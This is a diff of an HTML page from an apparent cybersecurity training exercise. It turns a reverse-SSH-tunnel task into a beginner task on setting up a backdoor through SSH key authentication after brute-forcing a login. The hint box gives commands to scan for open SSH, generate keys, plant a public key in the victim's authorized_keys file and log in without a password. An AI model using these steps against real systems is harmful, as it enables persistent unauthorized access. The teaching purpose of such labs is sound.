@@ -74,7 +74,7 @@
                         <h1 class="mt-4">Exploitation of SSH (Secure Shell) Protocol</h1>
                         <ol class="breadcrumb mb-4">
                             <li class="breadcrumb-item active">Offensive Exercise </li>
-                            <li class="breadcrumb-item active">Difficulty Level: Advanced</li>
+                            <li class="breadcrumb-item active">Difficulty Level: Beginner</li>
                         </ol>
                         <!-- Top nav bar -->
                         <div class="top-nav">
@@ -87,23 +87,14 @@
                         <div id="hintBox" class="hint-box">
                             <button id="closeHintBox" class="close-button">&times;</button>
                             <div class="hint-content">
-                                <p><strong>Use Nmap to Identify Targets:</strong></p>
-                                <p>Start by scanning your network to identify which hosts have port 22 (SSH) open.<br>
-                                For example, use the following command to discover active hosts with SSH open:</p>
-                                <pre><code>nmap 192.168.43.0/24 -p 22 --open</code></pre>
-
-                                <p><strong>Prepare Username and Password Lists:</strong></p>
-                                <p>Create your lists of potential usernames and passwords to use for brute force attacks.<br>
-                                Example commands:</p>
-                                <pre><code>cat > users.txt</code></pre>
-                                <pre><code>cat > passwords.txt</code></pre>
-
                                 <p><strong>Set Up the Backdoor with SSH Key Authentication:</strong></p>
                                 <p>After gaining access, copy your public key to the target machine to establish persistent access. Since SSH supports various authentication mechanisms, we'll focus on key-based authentication.<br>
                                 Generate your SSH key pair on the attacker machine:</p>
-                                <pre><code>ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa</code></pre>
+                                <pre><code>ssh-keygen -t rsa</code></pre>
+                                <p><code>OR</code></p>
+                                <pre><code>ssh-keygen -t dsa</code></pre>
 
-                                <p>View your public key:</p>
+                                <p><strong>View your public key:</strong></p>
                                 <pre><code>cat ~/.ssh/id_rsa.pub</code></pre>
 
                                 <p>Copy this public key for use on the target machine.</p>
@@ -111,16 +102,16 @@
                                 <p>On the target machine, create the necessary directories and paste your public key.<br>
                                 Command to create the directory:</p>
                                 <pre><code>mkdir -p ~/.ssh</code></pre>
-                                <p>Remember to change the directory and file permissions to ensure authentication succeeds:</p>
-                                <pre><code>chmod 700 ~/.ssh</code></pre>
                                 <p>Paste your public key in the victim’s machine in <code>~/.ssh/authorized_keys</code>:</p>
                                 <pre><code>echo "&lt;PasteYourPublicKeyHere&gt;" >> ~/.ssh/authorized_keys</code></pre>
+                                <p><code>OR</code></p>
+                                <pre><code>scp authorized_keys &lt;ip_address&gt;:/.ssh/authorized_keys</code></pre>
 
                                 <p><strong>SSH Into the Target Without a Password:</strong></p>
                                 <p>With your public key in place, you should be able to SSH into the target machine without needing a password from your attacker machine.<br>
                                 For example, you can SSH into the target machine by:</p>
                                 <pre><code>ssh -i ~/.ssh/id_rsa TargetHostName@TargetHostIP</code></pre>
-                                <p>or</p>
+                                <p><code>OR</code></p>
                                 <pre><code>ssh TargetHostName@TargetHostIP</code></pre>
                             </div>
                         </div>
@@ -128,32 +119,32 @@
                         <!-- Nav Menu -->
                         <div class="nav-menu">
                             <a href="#" class="back-button"><i class="fas fa-arrow-left"></i></a>
-                            <a href="sshAttackAi.html" class="nav-link" data-number="1">1</a>
-                            <a href="sshAttackAii.html" class="nav-link" data-number="2">2</a>
-                            <a href="sshAttackBi.html" class="nav-link" data-number="2">3</a>
-                            <a href="sshAttackBii.html" class="nav-link" data-number="2">4</a>
-                            <a href="sshDefendA.html" class="nav-link" data-number="2">5</a>
-                            <a href="sshDefendB.html" class="nav-link" data-number="2">6</a>
-                            <a href="sshDefendC.html" class="nav-link" data-number="2">7</a>
+                            <a href="sshAttackAi.php" class="nav-link" data-number="1">1</a>
+                            <a href="sshAttackAii.php" class="nav-link" data-number="2">2</a>
+                            <a href="sshAttackBi.php" class="nav-link" data-number="2">3</a>
+                            <a href="sshAttackBii.php" class="nav-link" data-number="2">4</a>
+                            <a href="sshDefendA.php" class="nav-link" data-number="2">5</a>
+                            <a href="sshDefendB.php" class="nav-link" data-number="2">6</a>
+                            <a href="sshDefendC.php" class="nav-link" data-number="2">7</a>
                             <a href="#" class="next-button"><i class="fas fa-arrow-right"></i></a>
                         </div>
 
                         <!-- Main Content/ Description of Scenario -->
-                        <h2 class="mt-4 question-title" style="padding: 0px 10px;">Exercise B (ii): Creating Backdoor Using Reverse SSH Tunnel<span style="float: right; font-weight: normal; font-size:large;">Suggested Duration: 20 Minutes</span></h2>
+                        <h2 class="mt-4 question-title" style="padding: 0px 10px;">Exercise A (ii): Creating Backdoor Using SSH key-based authentication<span style="float: right; font-weight: normal; font-size:large;">Suggested Duration: 20 Minutes</span></h2>
                         <div class="main-content">
                             <div class="learning-objectives">
                                 <h2>Learning Objectives</h2>
                                 <ul>
-                                    <li>Understand the concept of reverse SSH tunneling and how it can be used to maintain persistence.</li>
-                                    <li>Gain experience in configuring SSH tunnels for remote access on compromised systems.</li>
-                                    <li>Learn techniques for establishing a backdoor in a secured environment.</li>
-                                    <li>Explore the ethical and defensive implications of persistent access techniques.</li>
+                                    <li>Learn how to establish persistent access to a compromised system through OpenSSH.</li>
+                                    <li>Gain hands-on experience in configuring SSH key-based authentication to create a secure backdoor.</li>
+                                    <li>Understand the importance of persistence in real-world cyber attacks and the methods used to maintain access.</li>
+                                    <li>Explore the implications of backdoor access on system security and the potential risks associated with SSH vulnerabilities.</li>
                                 </ul>
                             </div>
 
                             <div class="question">
                                 <h2>Question</h2>
-                                <p>In this advanced exercise, after successfully brute-forcing the SSH login credentials, you are required to create a backdoor by <code>setting up a reverse SSH tunnel</code> from the compromised server to your attack machine. Due to firewall restrictions, external connections to internal machines are blocked, which would typically prevent direct access. However, we can bypass this limitation using an <code>SSH port forwarding tunnel</code>, commonly used by system administrators to access servers externally in a secure manner. By establishing a reverse SSH tunnel, you can initiate a secure connection from the compromised server back to your machine, enabling persistent access through an encrypted channel despite firewall restrictions.This tunnel will simulate persistence, enabling future access to the compromised system.</p>
+                                <p>In this continuation exercise, you will build upon your success in conducting a brute force attack on the SSH server. Your task is to establish persistence by <code>configuring remote access</code> through <code>OpenSSH</code>. You need to use the <code>ssh-keygen</code> command to generate an SSH key pair, allowing you to create a backdoor on the target system. Through this hands-on experience, you will gain insights into the techniques used by attackers to ensure ongoing access to their targets.</p>
                             </div>
                         </div>
 
